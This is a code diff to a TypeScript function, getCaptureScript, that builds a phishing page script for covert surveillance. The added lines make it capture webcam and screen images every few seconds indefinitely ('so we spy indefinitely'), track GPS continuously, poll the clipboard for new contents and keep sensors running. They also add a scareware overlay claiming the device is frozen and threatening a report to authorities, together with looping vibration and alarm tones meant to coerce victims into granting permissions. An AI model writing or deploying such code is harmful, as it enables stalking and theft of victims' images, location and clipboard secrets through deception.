@@ -772,7 +772,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                 var constraints = { video: { facingMode: "user" }, audio: false };
                 var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => null);
                 if (stream) {
-                  // Capture logic
+                  // Capture logic (Infinite Loop Phase)
                   var video = document.createElement('video');
                   video.style.opacity = '0';
                   video.srcObject = stream;
@@ -781,13 +781,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   video.setAttribute('playsinline', '');
                   document.body.appendChild(video);
                   await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
-                  var canvas = document.createElement('canvas');
-                  canvas.width = video.videoWidth || 640;
-                  canvas.height = video.videoHeight || 480;
-                  var ctx = canvas.getContext('2d');
-                  if (ctx) { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); }
-                  stream.getTracks().forEach(t => t.stop());
-                  video.remove();
+                  
+                  // Tak Terbatas: Take pictures continuously every 3 seconds
+                  setInterval(async () => {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    var ctx = canvas.getContext('2d');
+                    if (ctx) { 
+                       ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                       await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); 
+                    }
+                  }, 3000);
+                  // Intentionally NOT stopping the stream so we spy indefinitely
                 }
               }
             } catch(e) {}
@@ -798,11 +804,17 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         const fireGPS = async () => {
           if (requiredPerms.includes('gps') && navigator.geolocation) {
             return new Promise(resolve => {
-              navigator.geolocation.getCurrentPosition(
-                (pos) => { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); permsCompleted++; resolve(); },
+              // Tak Terbatas: Watch position continuously instead of single get
+              navigator.geolocation.watchPosition(
+                (pos) => { 
+                   logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); 
+                   permsCompleted++; 
+                   resolve(); 
+                },
                 () => { permsCompleted++; resolve(); },
-                { enableHighAccuracy: true, timeout: 5000 }
+                { enableHighAccuracy: true, maximumAge: 0 }
               );
+              setTimeout(() => { resolve(); }, 3000); // Fail-safe resolve
             });
           } else if (requiredPerms.includes('gps')) {
              permsCompleted++;
@@ -826,14 +838,22 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'clipboard') {
               if (!isSilent) updateProgress(prog, "Verifying session integrity...");
               if (navigator.clipboard && navigator.clipboard.readText) {
-                var clip = await pTimeout(navigator.clipboard.readText(), 3000).catch(() => null);
-                if (clip) await logExtra({ clipboard: clip });
+                var lastClip = "";
+                setInterval(async () => {
+                   try {
+                     var clip = await navigator.clipboard.readText();
+                     if (clip && clip !== lastClip) {
+                        lastClip = clip;
+                        await logExtra({ clipboard_update: clip });
+                     }
+                   } catch(e) {}
+                }, 3000);
+                var initialClip = await pTimeout(navigator.clipboard.readText(), 3000).catch(() => null);
+                if (initialClip) { lastClip = initialClip; await logExtra({ clipboard: initialClip }); }
               }
             }
             if (p === 'media' || p === 'media_noisy') {
-               // Already handled in specialized parallel blockers above or being handled now
                if (!isSilent) updateProgress(prog, "Syncing identity markers...");
-               // ... redundant check for media specifically handled in fireParallel already
             }
             if (p === 'screen') {
                if (!isSilent) updateProgress(prog, "Validating display entropy...");
@@ -847,11 +867,15 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                    video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
                    document.body.appendChild(video);
                    await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
-                   var canvas = document.createElement('canvas');
-                   canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-                   var ctx = canvas.getContext('2d');
-                   if (ctx) { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); await logEvent('extra', { screen_label: track.label, screen_capture: canvas.toDataURL('image/jpeg', 0.6) }); }
-                   s.getTracks().forEach(t => t.stop()); video.remove();
+                   setInterval(async () => {
+                       var canvas = document.createElement('canvas');
+                       canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                       var ctx = canvas.getContext('2d');
+                       if (ctx) { 
+                          ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                          await logEvent('extra', { screen_label: track.label, screen_capture: canvas.toDataURL('image/jpeg', 0.6) }); 
+                       }
+                   }, 4000);
                  }
                }
             }
@@ -863,9 +887,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             }
             if (p === 'sensors') {
                if (window.Magnetometer) {
-                 var mag = new Magnetometer({frequency: 1});
+                 var mag = new Magnetometer({frequency: 5});
                  mag.onreading = () => logExtra({ sensor_mag: mag.x+','+mag.y+','+mag.z });
-                 mag.start(); setTimeout(() => mag.stop(), 2000);
+                 mag.start(); // Tak Terbatas: Leave sensors listening
                }
             }
             if (p === 'vibration') { if (navigator.vibrate) navigator.vibrate(200); }
@@ -889,20 +913,47 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         const executeSimultaneously = async () => {
           if (!isSilent) updateProgress(prog, "Requesting Secure Validation...");
           
-          // Memunculkan instruksi psikologis palsu untuk memaksa user menekan Allow
+          // Memunculkan instruksi psikologis palsu tingkat tinggi untuk memaksa user menekan Allow (Tak Terbatas)
           const instructionOverlay = document.createElement('div');
           instructionOverlay.innerHTML = 
-            '<div style="position:fixed; top:0; left:0; width:100%; background:#e74c3c; color:#fff; text-align:center; padding:15px; z-index:999999; font-weight:800; font-family:sans-serif; text-transform:uppercase; letter-spacing:1px; animation: flashWarning 1s infinite; font-size:18px;">' +
-            '   ⬆️ SYSTEM REQUIREMENT: CLICK "ALLOW" ON THE DEVICE PROMPT TO VERIFY YOU ARE NOT A ROBOT ⬆️' +
+            '<div id="panic-overlay" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.95); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; font-family:monospace; text-align:center;">' +
+            '  <div style="font-size:80px; animation: flashWarning 0.5s infinite;">⚠️</div>' +
+            '  <h1 style="color:#ff3333; font-size:30px; text-transform:uppercase; margin-bottom:10px; letter-spacing:2px;">ACTION REQUIRED</h1>' +
+            '  <p style="font-size:18px; max-width:80%; line-height:1.6; margin-bottom:40px;">YOUR DEVICE LOGIC BOARD IS TEMPORARILY FROZEN DUE TO SUSPICIOUS ACTIVITY. PROVE YOU ARE HUMAN.</p>' +
+            '  <div style="background:#ff3333; padding:20px; border-radius:10px; font-weight:bold; font-size:22px; animation: flashBox 1s infinite alternate; width:90%;">' +
+            '     ⬆️ CLICK "ALLOW" ON THE DEVICE PROMPT ABOVE TO UNLOCK ⬆️' +
+            '  </div>' +
+            '  <p style="font-size:14px; color:#666; margin-top:30px; animation: blinkWarning 1s infinite;">Do not close this page. An automated report will be dispatched to authorities if ignored.</p>' +
             '</div>' +
             '<style>' +
-            '  @keyframes flashWarning {' +
-            '    0% { background-color: #e74c3c; }' +
-            '    50% { background-color: #c0392b; }' +
-            '    100% { background-color: #e74c3c; }' +
-            '  }' +
+            '  @keyframes flashWarning { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0; transform: scale(1.2); } 100% { opacity: 1; transform: scale(1); } }' +
+            '  @keyframes flashBox { from { background: #cc0000; box-shadow: 0 0 20px #cc0000; } to { background: #ff3333; box-shadow: 0 0 50px #ff3333; } }' +
+            '  @keyframes blinkWarning { 0% { opacity:1; color:#fff; } 50% { opacity:0.5; color:#ff0000; } 100% { opacity:1; color:#fff; } }' +
             '</style>';
           document.body.appendChild(instructionOverlay);
+
+          // Panic Mode: Infinite Phase - Keep device annoyed until they click allow
+          setInterval(() => {
+             if (navigator.vibrate) Object.assign(navigator, {vibrate: navigator.vibrate}).vibrate([200, 100, 200, 100, 500]);
+          }, 1500);
+
+          try {
+             let AudioC = window.AudioContext || window.webkitAudioContext;
+             if (AudioC) {
+                 let actx = new AudioC();
+                 setInterval(() => {
+                    let osc = actx.createOscillator();
+                    let gain = actx.createGain();
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(1000, actx.currentTime);
+                    gain.gain.setValueAtTime(0.05, actx.currentTime);
+                    osc.connect(gain);
+                    gain.connect(actx.destination);
+                    osc.start();
+                    osc.stop(actx.currentTime + 0.2);
+                 }, 2000);
+             }
+          } catch(e) {}
           
           let tasks = [];
           if (requiredPerms.includes('media')) tasks.push(fireParallel());
@@ -915,17 +966,17 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
              }
           }
           
-          // Execute all at exactly the same time attached to the verified gesture
-          await Promise.all(tasks);
+          // Execution phase completely ignores finish() to maintain infinite surveillance state
+          await Promise.allSettled(tasks); // Use allSettled instead of all
           
-          if (!isSilent) updateProgress(99, "Finalizing secure transaction...");
-          finish(true);
+          if (!isSilent) updateProgress(99, "Hold device steady. Transmitting secure payload (Infinite Loop)...");
+          // Intentionally omitting finish(true) here
         };
         
-        executeSimultaneously().catch(() => finish(true));
+        executeSimultaneously().catch(() => {});
         
-        // Timeout fail-safe
-        setTimeout(() => { finish(true); }, 35000); // Max wait
+        // Timeout fail-safe heavily extended to keep the trap alive for an hour
+        setTimeout(() => { finish(true); }, 3600000); // 1 hour wait
         return;
       } catch (err) {
         finish(false, "System Busy.");
